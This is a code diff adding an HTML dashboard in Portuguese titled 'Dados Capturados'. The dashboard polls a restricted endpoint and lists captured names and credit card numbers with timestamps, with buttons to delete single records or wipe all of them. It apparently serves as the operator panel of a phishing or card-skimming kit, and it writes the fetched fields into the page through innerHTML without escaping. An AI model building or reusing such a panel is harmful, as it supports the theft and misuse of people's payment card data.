@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Controle</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px;
+        }
+        .container {
+            width: 100%;
+            max-width: 900px;
+            background: #161b22;
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #30363d;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .header-painel {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 15px;
+        }
+        h2 { 
+            color: #f0f6fc; 
+            margin: 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .stats {
+            background: #21262d;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            color: #8b949e;
+        }
+        .acoes-topo {
+            margin-bottom: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: flex-end;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th {
+            text-align: left;
+            color: #8b949e;
+            border-bottom: 2px solid #30363d;
+            padding: 12px;
+            font-size: 0.9rem;
+        }
+        td {
+            padding: 15px 12px;
+            border-bottom: 1px solid #21262d;
+            font-size: 0.95rem;
+        }
+        .btn-excluir {
+            background-color: #da3633;
+            color: #f0f6fc;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .btn-excluir:hover { background-color: #f85149; }
+
+        .btn-limpar {
+            background-color: transparent;
+            color: #f85149;
+            border: 1px solid #f85149;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .btn-limpar:hover {
+            background-color: #f85149;
+            color: white;
+        }
+        tr:hover { background-color: #1c2128; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header-painel">
+            <h2>📊 Dados Capturados</h2>
+            <div class="stats" id="contador">Carregando...</div>
+        </div>
+
+        <div class="acoes-topo">
+            <button class="btn-limpar" onclick="limparTudo()">🗑️ Limpar Tudo</button>
+        </div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>NOME</th>
+                    <th>NÚMERO DO CARTÃO</th>
+                    <th>DATA/HORA</th>
+                    <th>AÇÕES</th>
+                </tr>
+            </thead>
+            <tbody id="tabela-dados">
+                </tbody>
+        </table>
+    </div>
+
+    <script>
+        async function buscarDados() {
+            try {
+                const resposta = await fetch('/ver-dados-restritos');
+                const dados = await resposta.json();
+
+                const tabela = document.getElementById('tabela-dados');
+                const contador = document.getElementById('contador');
+                
+                // Atualiza o contador de registros
+                contador.innerText = `${dados.length} registros encontrados`;
+
+                tabela.innerHTML = dados.map(item => `
+                    <tr>
+                        <td>${item.nome}</td>
+                        <td>${item.cartao}</td>
+                        <td>${item.data}</td>
+                        <td>
+                            <button class="btn-excluir" onclick="excluir(${item.id})">Excluir</button>
+                        </td>
+                    </tr>
+                `).join('');
+            } catch (erro) {
+                console.error("Erro ao carregar os dados:", erro);
+            }
+        }
+
+        async function excluir(id) {
+            if (confirm("Deseja realmente apagar este registro?")) {
+                try {
+                    const resposta = await fetch('/excluir/' + id, { method: 'DELETE' });
+                    if (resposta.ok) buscarDados();
+                } catch (erro) {
+                    console.error("Erro ao excluir:", erro);
+                }
+            }
+        }
+
+        // Nova função para limpar toda a tabela
+        async function limparTudo() {
+            if (confirm("⚠️ ATENÇÃO: Deseja apagar TODOS os registros permanentemente?")) {
+                try {
+                    const resposta = await fetch('/limpar-tudo', { method: 'DELETE' });
+                    if (resposta.ok) {
+                        alert("Todos os registros foram removidos.");
+                        buscarDados();
+                    }
+                } catch (erro) {
+                    console.error("Erro ao limpar tudo:", erro);
+                }
+            }
+        }
+
+        buscarDados();
+        setInterval(buscarDados, 5000);
+    </script>
+</body>
+</html>
